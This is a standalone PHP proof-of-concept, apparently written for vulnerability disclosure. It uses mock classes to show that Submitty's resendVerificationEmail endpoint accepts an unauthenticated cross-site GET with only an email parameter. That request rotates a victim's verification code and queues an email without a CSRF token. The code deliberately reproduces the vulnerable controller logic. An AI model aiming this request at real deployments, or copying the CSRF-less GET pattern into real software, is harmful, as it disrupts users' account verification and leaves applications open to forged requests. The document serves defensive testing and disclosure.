<?php
/**
 * Standalone PoC for Submitty AuthenticationController::resendVerificationEmail.
 *
 * This reproduces the vulnerable source-level behavior without a full Submitty
 * deployment: a cross-site/unauthenticated GET request with only an email query
 * parameter reaches verification-code rotation and queues an email without any
 * CSRF token, session binding, or POST-only method requirement.
 *
 * Run:
 *   php PoC.php
 */

class MockUnverifiedUser {
    public string $email;
    public string $user_id;
    public string $verification_code;
    public DateTime $verification_expiration;

    public function __construct(string $email, string $user_id, string $code) {
        $this->email = $email;
        $this->user_id = $user_id;
        $this->verification_code = $code;
        $this->verification_expiration = new DateTime('+5 minutes');
    }

    public function setVerificationCode(string $code): void {
        $this->verification_code = $code;
    }

    public function setVerificationExpiration(DateTime $expiration): void {
        $this->verification_expiration = $expiration;
    }

    public function getUserInfo(): array {
        return ['user_id' => $this->user_id];
    }
}

class MockQueries {
    public bool $queued_email_exists = false;
    public array $queued_emails = [];

    public function hasQueuedEmail(string $email): bool {
        return $this->queued_email_exists;
    }
}

class MockNotificationFactory {
    public array $sent = [];

    public function sendEmails(array $emails): void {
        foreach ($emails as $email) {
            $this->sent[] = $email;
        }
    }
}

class MockConfig {
    public function isUserCreateAccount(): bool { return true; }
    public function isDebug(): bool { return false; }
    public function getBaseUrl(): string { return 'https://submitty.example/'; }
}

class MockCore {
    public MockConfig $config;
    public MockQueries $queries;
    public MockNotificationFactory $notification_factory;
    public array $unverified_users;
    public array $messages = [];

    public function __construct() {
        $this->config = new MockConfig();
        $this->queries = new MockQueries();
        $this->notification_factory = new MockNotificationFactory();
        $this->unverified_users = [
            'victim@example.edu' => new MockUnverifiedUser('victim@example.edu', 'victim_user', 'OLD-CODE-1234'),
        ];
    }

    public function getConfig(): MockConfig { return $this->config; }
    public function getQueries(): MockQueries { return $this->queries; }
    public function getNotificationFactory(): MockNotificationFactory { return $this->notification_factory; }
    public function getDateTimeNow(): DateTime { return new DateTime('2026-06-29 12:00:00'); }
    public function addErrorMessage(string $msg): void { $this->messages[] = ['error', $msg]; }
    public function addSuccessMessage(string $msg): void { $this->messages[] = ['success', $msg]; }
    public function buildUrl(array $parts): string { return '/' . implode('/', $parts); }
}

class MockEmail {
    public array $details;
    public function __construct(MockCore $core, array $details) { $this->details = $details; }
}

function generateVerificationCode(MockCore $core): array {
    // Submitty uses Utils::generateRandomString(); use a deterministic different value for reproducible PoC output.
    return ['code' => 'NEW-CODE-5678', 'expiration' => $core->getDateTimeNow()->modify('+15 minutes')];
}

function getUnverifiedUser(MockCore $core, string $email): ?MockUnverifiedUser {
    return $core->unverified_users[$email] ?? null;
}

function updateUserVerificationValues(MockCore $core, string $email, string $verification_code, DateTime $expiration): bool {
    $unverified_user = getUnverifiedUser($core, $email);
    if ($unverified_user === null) {
        return false;
    }
    $unverified_user->setVerificationCode($verification_code);
    $unverified_user->setVerificationExpiration($expiration);
    return true;
}

function sendVerificationEmail(MockCore $core, string $email, string $verification_code, string $user_id): void {
    $url = $core->getConfig()->getBaseUrl() . 'authentication/verify_email?verification_code=' . $verification_code;
    $details = [
        'subject' => 'Submitty Email Verification',
        'body' => "Verification Code: {$verification_code}\nVerification Link: {$url}",
        'email_address' => $email,
        'to_name' => $user_id,
    ];
    $core->getNotificationFactory()->sendEmails([new MockEmail($core, $details)]);
}

function vulnerable_resendVerificationEmail(MockCore $core, bool $logged_in = false): string {
    // Mirrors site/app/controllers/AuthenticationController.php:381-407.
    if ($logged_in) {
        return 'redirect:/home';
    }
    if (!$core->getConfig()->isUserCreateAccount()) {
        $core->addErrorMessage('Users cannot create their own account.');
        return 'redirect:/authentication/login';
    }
    if (!isset($_GET['email'])) {
        $core->addErrorMessage('You must specify an email to send the verification to.');
        return 'redirect:/authentication/email_verification';
    }
    if ($core->getQueries()->hasQueuedEmail($_GET['email'])) {
        $core->addErrorMessage('Please wait before sending a new email.');
        return 'redirect:/authentication/email_verification';
    }
    $verification_values = generateVerificationCode($core);
    if (!updateUserVerificationValues($core, $_GET['email'], $verification_values['code'], $verification_values['expiration'])) {
        $core->addErrorMessage('Either you have already verified your email, or that email is not associated with an account.');
        return 'redirect:/authentication/login';
    }
    $unverified_user = getUnverifiedUser($core, $_GET['email']);
    sendVerificationEmail($_GET['email'] ? $core : $core, $_GET['email'], $verification_values['code'], $unverified_user->getUserInfo()['user_id']);
    $core->addSuccessMessage('Verification email resent.');
    return 'redirect:/authentication/email_verification';
}

$core = new MockCore();
$before = $core->unverified_users['victim@example.edu']->verification_code;

// Simulate an attacker-controlled cross-site GET. There is intentionally no session and no csrf_token.
$_SERVER['REQUEST_METHOD'] = 'GET';
$_GET = ['email' => 'victim@example.edu'];
$_POST = [];

$result = vulnerable_resendVerificationEmail($core, false);
$after = $core->unverified_users['victim@example.edu']->verification_code;
$sent = count($core->getNotificationFactory()->sent);

print "Submitty resendVerificationEmail GET state-change PoC\n";
print "request_method=" . $_SERVER['REQUEST_METHOD'] . "\n";
print "csrf_token_present=" . (isset($_GET['csrf_token']) || isset($_POST['csrf_token']) ? 'yes' : 'no') . "\n";
print "before_verification_code={$before}\n";
print "after_verification_code={$after}\n";
print "queued_emails={$sent}\n";
print "controller_result={$result}\n";

if ($before !== $after && $sent === 1) {
    print "[VULNERABLE] Unauthenticated GET rotated the verification code and queued an email without a CSRF token.\n";
    exit(0);
}

print "[NOT VULNERABLE] State did not change.\n";
exit(1);
